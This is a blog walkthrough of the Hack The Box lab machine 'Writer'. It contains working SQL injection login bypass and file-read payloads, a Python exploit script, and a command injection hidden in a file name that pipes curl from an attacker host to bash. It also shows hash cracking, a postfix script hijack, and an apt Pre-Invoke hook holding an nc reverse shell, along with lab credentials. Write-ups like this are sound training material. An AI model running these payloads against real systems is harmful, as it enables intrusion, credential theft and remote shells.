---
layout: single
title: "Walktrough: HTB Writer"
namespace: htb-writer
category: Walkthrough
tags: HackTheBox htb-medium htb-linux
date: 2021-07-03 16:00:00
header:
   teaser: https://i.imgur.com/JTsexnY.png
---

Hello guys!

This week's machine will be **Writer**, another medium-rated Linux machine from https://www.hackthebox.eu/), created by [TheCyberGeek](https://app.hackthebox.eu/users/114053).<!--more-->

:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
{: .notice--info}

![HTB Writer](https://i.imgur.com/kZntfPn.png){: .align-center}

- **Add Comment**

## Enumeration

As usual, started enumeration with a `nmap` quick scan to list published services

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.11.101
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-01 12:04 -03
Nmap scan report for 10.129.149.102
Host is up (0.071s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -24s
|_nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-08-01T15:04:26
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.81 seconds
```

### 149 e 445/TCP - SMB Service

Looking for some guest access in an SMB share

```bash
$ smbmap -u user -p pass -H 10.129.149.102
[+] Guest session       IP: 10.129.149.102:445  Name: 10.129.149.102
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        writer2_project                                         NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (writer server (Samba, Ubuntu))
                                                                                                                                 
$ smbmap -u user -p pass -H 10.129.149.102 -P 139
[+] Guest session       IP: 10.129.149.102:139  Name: 10.129.149.102
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        writer2_project                                         NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (writer server (Samba, Ubuntu))
```

No access, so let's proceed with other service enumeration

### 80/TCP - HTTP Service

Accessing the page, we can see a blog with several histories.

![HTB Writer - Story Bank Blog](https://i.imgur.com/T2Llxkh.png){:  .align-center}

From `whatweb` execution, we can see the DNS `writer.htb`, which might be needed sometime in the future for this box resolution, which was later added to the local hosts file.

```bash
$ whatweb http://10.10.11.101
http://10.10.11.101 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.101], JQuery, Script, Title[Story Bank | Writer.HTB]
```

Inspecting the page references using `curl` we can see several blog posts and their assets but no other links to resources that could help us identify a CMS platform running.

```bash
$ curl -L http://10.10.11.101 | grep -Eo 'href=".*"|src=".*"' | awk -F" " '{print $1}' | awk -F"\"" '{print $2}' | sort -u
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 12772  100 12772    0     0  47303      0 --:--:-- --:--:-- --:--:-- 47303
#
/
/about
/blog/post/1
/blog/post/2
/blog/post/21
/blog/post/3
/blog/post/4
/blog/post/5
/blog/post/6
/blog/post/7
/blog/post/8
/contact
#content
/static/blog/post/1
/static/blog/post/2
/static/blog/post/21
/static/blog/post/3
/static/blog/post/4
/static/blog/post/5
/static/blog/post/6
/static/blog/post/7
/static/blog/post/8
/static//img/brain-01.jpg
/static//img/fishinstream.jpg
/static//img/lifesleftovers.jpg
/static/img/me.jpg
/static//img/rain.jpg
/static//img/shell.jpg
/static//img/tmpfamz3siw.jpg
/static//img/treesurgeon.jpg
/static//img/trickster.jpg
/static//img/violinist.jpg
```

Besides the dummy content available on these posts, I have noticed that each of them is written by a different author, information that might be useful sometime later. Below is the list of identified users as well as the Powershell snippet written to retrieve this information

```bash
$ cat get-Authors.ps1
#!/usr/bin/pwsh

$authors = @()
for ($i=1; $i -lt 11; $i++){
        (Invoke-RestMethod -Method get -Uri "http://writer.htb/blog/post/$i") -match '.*<a>By (.*)</a>.*' | Out-Null
        $authors += $Matches[1]
}

$authors
                                                                                                                                 
$ ./get-Authors.ps1
Nina Chyll
Yolanda Wu
Nina Chyll
Catherine Hill
Evelyn Kill
Christina Marie
R.A
Shawn Forno
Shawn Forno
Shawn Forno
```

After this enumeration checked contents of a `gobuster dir` enumeration, where some interesting directories were found

```bash
$ gobuster dir -u http://10.10.11.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ./gobuster.txt -x html,txt,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.101
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2021/08/19 14:01:39 Starting gobuster in directory enumeration mode
===============================================================
/contact              (Status: 200) [Size: 4905]
/about                (Status: 200) [Size: 3522]
/static               (Status: 301) [Size: 313] [--> http://10.10.11.101/static/]
/logout               (Status: 302) [Size: 208] [--> http://10.10.11.101/]
/dashboard            (Status: 302) [Size: 208] [--> http://10.10.11.101/]
/administrative       (Status: 200) [Size: 1443]
Progress: 145484 / 882244 (16.49%)
```

- In `/contact,` we just have a contact form but the `/contact.php` page to which the form posts data wasn't found.
- In `/about`, there's not much information but there's an `admin@writer.htb` e-mail address being mentioned, which could one valid account
- Accessing `/static` I was surprised by seeing **directory browsing** enabled but no interesting information available there, while `/logout` and `/dashboard` redirects to the main page.
- Things got interesting when I accessed `/administrative`, which presents the login page below.

![HTB Writer - Admin Login](https://i.imgur.com/KWfbBm7.png){: .align-center}

What called my attention at this moment was the **Bootstrap** logo, so executing `whatweb` once again for this page returned version **4.1.3** which contains some XSS Vulnerabilities but as user interaction is required, I'll skip that for now.

```bash
$ whatweb http://writer.htb/administrative
http://writer.htb/administrative [200 OK] Apache[2.4.41], Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.101], PasswordField[password], Title[Admin Panel]
```

Searching for this Bootstrap version I wasn't able to find anything pre-built for the administration page, so I would assume that this is an open-source project or custom-developed administration portal.

Considering that it might be poorly developed, SQL Injection might be present and, doing a quick attempt using Burp Suite Intruder in Sniper mode associated with authentication bypasses available in [PayloadsAllTheThings/SQL Injection at master · swisskyrepo/PayloadsAllTheThings (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) I gave it a try based in the request below:

```http
POST /administrative HTTP/1.1
Host: writer.htb
Content-Length: 26
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://writer.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://writer.htb/administrative
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

uname=admin&password=admin
```

As expected, some payloads worked successfully, where we can see that anything with a Length different than 1763 is a success :smile:

![HTB Writer - Burp Intruder](https://i.imgur.com/jEsTiFx.png){: .align-center}

Using the first payload in the list (in this case, was `admin'#`) I was able to successfully log on and have access to this administration dashboard.

![HTB Writer - Admin Dashboard](https://i.imgur.com/Sz4rOg9.png){: .align-center}

Poking around with the administration console, located a **Stories** menu at the left side which allowed me to add, edit or delete currently published stories in the portal and what called attention when adding a new story was the possibility to upload a `*.jpg` file to be used.

![HTB Writer - Dashboard - Add Story](https://i.imgur.com/FkUBtfs.png){: .align-center}

Doing a quick test with a real image, later inspecting the published post, noticed that the link to the content is broken, which was created pointing me to `http://writer.htb/static/blog/post/9`. Removing the static portion of the URL, got access to my post, where the image was stored with the same name as uploaded but in the `/img` directory as `/static/img/placeholder.jpg`.

![HTB Writer - Added Story](https://i.imgur.com/nsLanY7.png){: .align-center}

Reviewing the directory `/static/img` as we found previously I can see it there along with other content already present on the page. As this seems to be generated using a static CMS engine (like Jekyll, Hugo, or similar) we might not get code execution through a fake image upload so we should probably be able to achieve code execution from other methods.

Putting this apart for a moment, as we might not get anything from the information we have until now, returned to the SQL Injection previously identified.

Getting the Login Request and sending it to `sqlmap`, got a true positive for its detection but as it has detected a Blind SQL Injection, It was taking too much time to enumerate data.

Manually inspecting the request on Burp, noticed that when authentication bypass succeeds, we receive a Welcome page mentioning the username, and then we're redirected to `/dashboard`. As we have identified one injection previously that wasn't pointing to `admin`, gave another look on it and username admin was still being shown, as below

```bash
$ curl -i -X $'POST' --data-binary $'uname=%27+or+1%3D1+--+&password=pass' http://writer.htb/administrative
HTTP/1.1 200 OK
Date: Fri, 20 Aug 2021 19:19:19 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 1296
Vary: Cookie,Accept-Encoding
Set-Cookie: session=eyJ1c2VyIjoiJyBvciAxPTEgLS0gIn0.YSAANw.tTdjVuVEhn9ZHaIg40Acyof-M9M; HttpOnly; Path=/
Content-Type: text/html; charset=utf-8

<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="refresh" content="0.1; URL=/dashboard" />
    <title>Redirecting | Writer.HTB</title>
    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="css/redirect.css" rel="stylesheet">
</head>

<body>
    <div class="wrapper">
        <div class="page vertical-align text-center">
            <div class="page-content vertical-align-middle">
                <header>
                    <h3 class="animation-slide-top">Welcome admin</h3>
                </header>
                <p class="success-advise">Redirecting you to the dashboard. If you are not redirected then click the button below to be redirected.</p>
                <a class="btn btn-primary btn-round mb-5" href="/dashboard">CLICK HERE</a>
                <footer class="page-copyright">
                    <p>© Writer.HTB 2021. All RIGHT RESERVED.</p>
                </footer>
            </div>
        </div>
    </div>
    <script src="vendor/jquery/jquery.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
</body>

</html>
```

After some attempts verified that I was able to gather information using `union all` and, using MySQL `FILE_LOAD()` I was able to read data from files inside the server. To make it easier read them, wrote a simple python script below

```python
#!/usr/bin/python3

import requests, argparse, re, html 

parser = argparse.ArgumentParser(description='Downloads files using MYSQL LOAD_FILES from writer.htb administrative login page')
parser.add_argument('--file', metavar='file',type=str, help='File Path to be retrieved')

args = parser.parse_args()

url = "http://writer.htb/administrative"
injection = "' union all select 1,CONCAT('R@nD0mD4tA',LOAD_FILE('{}'),'R@nD0mD4tA'),3,4,5,6 -- ".format(args.file)
print(injection)

postData = {
    'uname': injection,
    'password' : 'admin'
}

r = requests.post(url=url, data=postData)
regex = r'R@nD0mD4tA(.|\n)*?R@nD0mD4tA'
matches = re.finditer(regex, r.text, re.MULTILINE)

for matchNum, match in enumerate(matches, start=1):
    match = html.unescape(match.group().replace("R@nD0mD4tA",""))
    print ("Content of {file}:\n\n{match}".format(file=args.file, match = match))
```

Now with an easier way to obtain information from the box, started by enumerating users from `/etc/passwd` file, where we could list usernames with console, listing **kyle** and **john** as possible targets.

```bash
$ grep -E -v "nologin|false" passwd
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash
filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh
john:x:1001:1001:,,,:/home/john:/bin/bash
```

Also, as we're aware that this app is running into apache, querying the default apache site configuration at `/etc/apache2/sites-enabled/000-default.conf` where we could identify the physical location of files inside the file system (`/var/www/writer.htb`)

```bash
$ ./enumFiles.py --file /etc/apache2/sites-enabled/000-default.conf | grep -v "^#"
' union all select 1,CONCAT('R@nD0mD4tA',LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'),'R@nD0mD4tA'),3,4,5,6 --
Content of /etc/apache2/sites-enabled/000-default.conf:

<VirtualHost *:80>
        ServerName writer.htb
        ServerAdmin admin@writer.htb
        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
        <Directory /var/www/writer.htb>
                Order allow,deny
                Allow from all
        </Directory>
        Alias /static /var/www/writer.htb/writer/static
        <Directory /var/www/writer.htb/writer/static/>
                Order allow,deny
                Allow from all
        </Directory>
        ErrorLog ${APACHE_LOG_DIR}/error.log
        LogLevel warn
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

        # Collect static for the writer2_project/writer_web/templates
```

This file has disclosed the path for Python Web Server Gateway Interface (WSGI) file, with contents below

```bash
$ ./enumFiles.py --file /var/www/writer.htb/writer.wsgi
' union all select 1,CONCAT('R@nD0mD4tA',LOAD_FILE('/var/www/writer.htb/writer.wsgi'),'R@nD0mD4tA'),3,4,5,6 --
Content of /var/www/writer.htb/writer.wsgi:

#!/usr/bin/python
import sys
import logging
import random
import os

# Define logging
logging.basicConfig(stream=sys.stderr)
sys.path.insert(0,"/var/www/writer.htb/")

# Import the __init__.py from the app folder
from writer import app as application
application.secret_key = os.environ.get("SECRET_KEY", "")
```

This file imports the file `/var/www/writer.htb/writer/__init__.py` which was also downloaded using the shared python snippet and from it, we could check for a Code Injection opportunity in Writer :smile:.

From the `__init__.py` we could get the following info:

- Database credentials:  **admin:ToughPasswordToCrack**, from function `connections()`
- For both app routes `/dashboard/stories/add` and `/dashboard/stories/edit`, if `image_url` is specified it downloads a local copy and them **run OS command `mv`**, moving it to the folder `/var/www/writer.htb/writer/static/img/`, which could possibly get us a foothold opportunity :smile:

## Initial access

Playing around in my machine with an excerpt of the `__init__.py` which handles the image_url attribute I have figured out that, if I upload a file with a code execution on its name like `poc.jpg; $(id)` it will execute the command when it tries to `mv` the files around.

```bash
$ python3 test.py
mv /opt/dcruz/htb/writer-10.10.11.101/exploit/poc.jpg; $(id) /opt/dcruz/htb/writer-10.10.11.101/exploit/poc.jpg; $(id).jpg
mv: missing destination file operand after '/opt/dcruz/htb/writer-10.10.11.101/exploit/poc.jpg'
Try 'mv --help' for more information.
sh: 1: uid=1000(zurc): not found
sh: 1: uid=1000(zurc): not found
mv /tmp//opt/dcruz/htb/writer-10.10.11.101/exploit/poc.jpg; $(id).jpg /opt/dcruz/htb/writer-10.10.11.101/exploit//opt/dcruz/htb/writer-10.10.11.101/exploit/poc.jpg; $(id).jpg
mv: missing destination file operand after '/tmp//opt/dcruz/htb/writer-10.10.11.101/exploit/poc.jpg'
Try 'mv --help' for more information.
sh: 1: uid=1000(zurc): not found
sh: 1: uid=1000(zurc): not found
```

Changing that to a reverse shell payload and making a request to the webserver, I was able to get a reverse shell, as detailed below:

- Creates a file to be uploaded as a story image

  ```bash
  $echo 'curl http://10.10.10.10/1 | bash' | base64 -d
  Y3VybCBodHRwOi8vMTAuMTAuMTQuMTI1LzEgfCBiYXNoCg==
  
  $ touch 'poc.jpg; $(echo Y3VybCBodHRwOi8vMTAuMTAuMTQuMTI1LzEgfCBiYXNoCg== | base64 -d | bash);'
  ```

- Start a listener for the port you have specified

- Create a Story image in the portal and upload it normally using the portal. This still won't trigger the vulnerability we have identified as `image_url` isn't populated.

- Now, for the same post, edit it and intercept the request on Burp Suite. You don't need to specify anything during edit but you have to add the following value of `image_url`

  ```plaintext
  [...]
  
  ------WebKitFormBoundarylL9ESPDLhZISoR3l
  Content-Disposition: form-data; name="image_url"
  
  file:///var/www/writer.htb/writer/static/img/poc.jpg; $(echo Y3VybCBodHRwOi8vMTAuMTAuMTQuMTI1LzEgfCBiYXNoCg== | base64 -d | bash);
  
  [...]
  ```

- When submitted, the edit request will result in a code execution in the target, returning to you a reverse shell :smiley:

## User flag

Running linpeas

```plaintext
@reboot cd /var/www/writer2_project && python3 manage.py runserver 127.0.0.1:8080
```

Permissions

```bash
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)                                                       uid=1001(john) gid=1001(john) groups=1001(john),1003(management)       
```

Passwords on MySQL

```plaintext
╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mariadb.cnf' Mysql user: user = djangouser
From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = mysql
Found readable /etc/mysql/my.cnf
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/
[client]
database = dev
user = djangouser
password = DjangoSuperPassword
default-character-set = utf8
```

Enumeration of database

```bash
www-data@writer:/$ mysql -u djangouser -p
MariaDB [dev]> show databases;
+--------------------+
| Database           |
+--------------------+
| dev                |
| information_schema |
+--------------------+
2 rows in set (0.000 sec)

MariaDB [dev]> use dev;
Database changed
MariaDB [dev]> show tables;
+----------------------------+
| Tables_in_dev              |
+----------------------------+
| auth_group                 |
| auth_group_permissions     |
| auth_permission            |
| auth_user                  |
| auth_user_groups           |
| auth_user_user_permissions |
| django_admin_log           |
| django_content_type        |
| django_migrations          |
| django_session             |
+----------------------------+
10 rows in set (0.000 sec)

MariaDB [dev]> show columns from auth_user;
+--------------+--------------+------+-----+---------+----------------+
| Field        | Type         | Null | Key | Default | Extra          |
+--------------+--------------+------+-----+---------+----------------+
| id           | int(11)      | NO   | PRI | NULL    | auto_increment |
| password     | varchar(128) | NO   |     | NULL    |                |
| last_login   | datetime(6)  | YES  |     | NULL    |                |
| is_superuser | tinyint(1)   | NO   |     | NULL    |                |
| username     | varchar(150) | NO   | UNI | NULL    |                |
| first_name   | varchar(150) | NO   |     | NULL    |                |
| last_name    | varchar(150) | NO   |     | NULL    |                |
| email        | varchar(254) | NO   |     | NULL    |                |
| is_staff     | tinyint(1)   | NO   |     | NULL    |                |
| is_active    | tinyint(1)   | NO   |     | NULL    |                |
| date_joined  | datetime(6)  | NO   |     | NULL    |                |
+--------------+--------------+------+-----+---------+----------------+
11 rows in set (0.002 sec)

MariaDB [dev]> select username,password from auth_user;
+----------+------------------------------------------------------------------------------------------+
| username | password                                                                                 |
+----------+------------------------------------------------------------------------------------------+
| kyle     | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= |
+----------+------------------------------------------------------------------------------------------+
1 row in set (0.001 sec)

```

Searching in documentation, noticed that this hash is from format `10000 | Django (PBKDF2-SHA256)`. Ran hashcat and found password **marcoantonio** for user `kyle`

```bash
$ hashcat -m 10000 users --wordlist /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Xeon(R) CPU E5-2673 v3 @ 2.40GHz, 5845/5909 MB (2048 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
```

Connected to athe ccount using SSH and obtained the first flag

```bash
kyle@writer:~$ cat user.txt
0e0ece42114bf4462606e59011922f40
```

## Root flag

As usual, started enumeration for privesc running `sudo -l` but no privileges were granted for `kyle`.  Talking about privileges, `kyle` is a member of `smbgroup` and his account might be able to access the Samba share previously enumerated.

This group grants `kyle` access to folder `/var/www/writer2_project`, which is executed every 5 minutes a reload in server.

Kyle is also a member of the `filter` group, which returned the following files

```bash
kyle@writer:~$ find / -group filter 2>/dev/null
/etc/postfix/disclaimer
/var/spool/filter
```

While the `/var/spool/filter` directory was empty, the script `/etc/postfix/disclaimer` was very interesting

```bash
#!/bin/sh
# Localize these.
INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail

# Get disclaimer addresses
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses

# Exit codes from <sysexits.h>
EX_TEMPFAIL=75
EX_UNAVAILABLE=69

# Clean up when done or when aborting.
trap "rm -f in.$$" 0 1 2 3 15

# Start processing.
cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
$EX_TEMPFAIL; }

cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }

# obtain From address
from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`

if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
  /usr/bin/altermime --input=in.$$ \
                   --disclaimer=/etc/postfix/disclaimer.txt \
                   --disclaimer-html=/etc/postfix/disclaimer.txt \
                   --xheader="X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm" || \
                    { echo Message content rejected; exit $EX_UNAVAILABLE; }
fi

$SENDMAIL "$@" <in.$$

exit $?
```

This script apparently appends a disclaimer to all messages sent by users in `/etc/postfix/disclaimer_addresses`. Checking its content we can see that `kyle@write.htb` is one of them, so we would be able to trigger this script.

The point is that none of the used binaries are vulnerable to a privesc but, as isn't clear which account triggers this script, we could move laterally and obtain another credential in this box by appending a command to spawn a reverse shell to us, once we're a member of `filter` group and this group has write permissions in this file.

```bash
kyle@writer:/dev/shm$ ls -la /etc/postfix/disclaimer
-rwxrwxr-x 1 root filter 1021 Aug 21 04:22 /etc/postfix/disclaimer
```

Appended the reverse shell line below to the beginning of the script and then triggered an e-mail sending using the script below.

```python
import smtplib

mailAddress = "kyle@writer.htb"
message = "Subject: Test message\n\nTest message."

try:
    server = smtplib.SMTP("127.0.0.1", 25)
    server.ehlo()
    server.sendmail(mailAddress, mailAddress, message)
except Exception as e:
    print(e)
finally:
    server.quit()
```

The session I have obtained was from user `john`. From his account noticed that he's a member of the `management` group, which has permissions on directory `/etc/apt/apt.conf.d`

```bash
john@writer:~$ find / -group management 2>/dev/null
/etc/apt/apt.conf.d
```

Searching a little about this privilege, noticed that it could be used to gain root access, according to [Linux for Pentester: APT Privilege Escalation (hackingarticles.in)](https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/). This was confirmed also via [apt.conf(5) — apt — Debian testing — Debian Manpages](https://manpages.debian.org/testing/apt/apt.conf.5.en.html)

> **Pre-Invoke**, **Post-Invoke**
>
> This is a list of shell commands to run before/after invoking [dpkg(1)](https://manpages.debian.org/testing/dpkg/dpkg.1.en.html). Like options this must be specified in list notation. The commands are invoked in order using /bin/sh; should any fail APT will abort.

```bash
echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f"};' > /etc/apt/apt.conf.d/writer
```

after some time, a connection is received, probably due to a system timer updating packages

```bash
$ nc -lnvp 4443                                                                                                     
listening on [any] 4443 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.11.101] 49836
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
<redacted>
```

I hope you guys have enjoyed it!

See you in the next post :wink:

